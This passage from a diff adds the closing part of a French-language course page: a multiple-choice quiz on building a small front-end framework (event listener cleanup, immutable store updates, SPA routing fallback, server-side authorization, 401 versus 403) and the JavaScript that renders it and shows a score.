<code>addEventListener</code> dans un composant ?", "opts": ["Pour rendre l'écouteur plus rapide", "Pour pouvoir supprimer tous les écouteurs d'un coup avec abort() lors d'un update ou unmount", "C'est obligatoire en TypeScript", "Pour que l'événement remonte au parent"], "a": 1, "exp": "Sans nettoyage, les anciens écouteurs restent en mémoire et se déclenchent en double."}, {"q": "Dans le <code>Store</code>, pourquoi <code>set()</code> crée-t-il un nouvel objet plutôt que de modifier l'existant ?", "opts": ["Pour économiser de la mémoire", "Pour que les listeners puissent comparer l'ancien et le nouvel état", "Parce que les objets sont en lecture seule en JavaScript", "Pour déclencher le ramasse-miettes"], "a": 1, "exp": "C'est l'immutabilité, comme <code>setState</code> en React : <code>prev !== state</code> permet de détecter un changement."}, {"q": "L'utilisateur recharge la page sur <code>/projets/3</code> et obtient une 404. Que manque-t-il ?", "opts": ["Un lien data-link", "Le serveur doit renvoyer index.html pour les URL inconnues hors /api", "Un écouteur popstate", "Un appel à history.pushState"], "a": 1, "exp": "Le serveur reçoit la requête avant le routeur front : il doit renvoyer l'application, qui affichera ensuite la bonne vue."}, {"q": "Une route a <code>roles: ['trainer']</code>. Qu'est-ce qui empêche vraiment un étudiant de voir les évaluations ?", "opts": ["La garde du routeur front", "Le fait que le lien soit caché", "La vérification du token et du rôle par l'API, qui renvoie 403", "Le type TypeScript Role"], "a": 2, "exp": "Tout ce qui est côté navigateur peut être modifié. Seul le serveur fait foi."}, {"q": "L'API répond <code>401</code> à une requête. Quelle est la bonne réaction ?", "opts": ["Afficher « Accès refusé » et rester sur la page", "Réessayer la requête en boucle", "Vider la session et rediriger vers la page de connexion", "Ignorer l'erreur"], "a": 2, "exp": "401 = non authentifié (token absent ou expiré). « Accès refusé » correspond au 403."}];
+  const quiz = document.getElementById('quiz');
+  let answered = 0, score = 0;
+  function renderQuiz() {
+    answered = 0; score = 0; quiz.replaceChildren();
+    QUIZ.forEach((q, qi) => {
+      const box = document.createElement('div'); box.className = 'q';
+      box.innerHTML = `<p class="q-title">${qi + 1}. ${q.q}</p>`;
+      q.opts.forEach((o, oi) => {
+        const btn = document.createElement('button'); btn.type = 'button'; btn.className = 'q-opt'; btn.innerHTML = o;
+        btn.addEventListener('click', () => {
+          box.querySelectorAll('.q-opt').forEach((b, k) => { b.disabled = true; if (k === q.a) b.classList.add('right'); });
+          if (oi !== q.a) btn.classList.add('wrong'); else score++;
+          const exp = document.createElement('p'); exp.className = 'q-exp';
+          exp.innerHTML = (oi === q.a ? '✅ Bonne réponse. ' : '❌ Pas tout à fait. ') + q.exp;
+          box.append(exp);
+          if (++answered === QUIZ.length) showScore();
+        });
+        box.append(btn);
+      });
+      quiz.append(box);
+    });
+  }
+  function showScore() {
+    const msg = score === QUIZ.length ? 'Parfait, tu maîtrises les bases de ton framework.'
+      : score >= 7 ? 'Très bien. Relis les explications des questions ratées.'
+      : score >= 5 ? 'Les bases sont là. Reprends les étapes concernées avant de coder.'
+      : 'Reprends le cours étape par étape, puis refais le quiz.';
+    const s = document.createElement('div'); s.className = 'q-score';
+    s.innerHTML = `<div><strong>${score} / ${QUIZ.length}</strong><div>${msg}</div></div>`;
+    const again = document.createElement('button'); again.type = 'button'; again.textContent = 'Recommencer';
+    again.addEventListener('click', () => { renderQuiz(); quiz.scrollIntoView({ behavior: 'smooth' }); });
+    s.append(again); quiz.append(s);
+  }
+  renderQuiz();
+
+  const start = panels.findIndex((p) => '#etape-' + p.id === location.hash);
+  show(start >= 0 ? start : 0);
+})();
+</script>
+</body>
+</html>
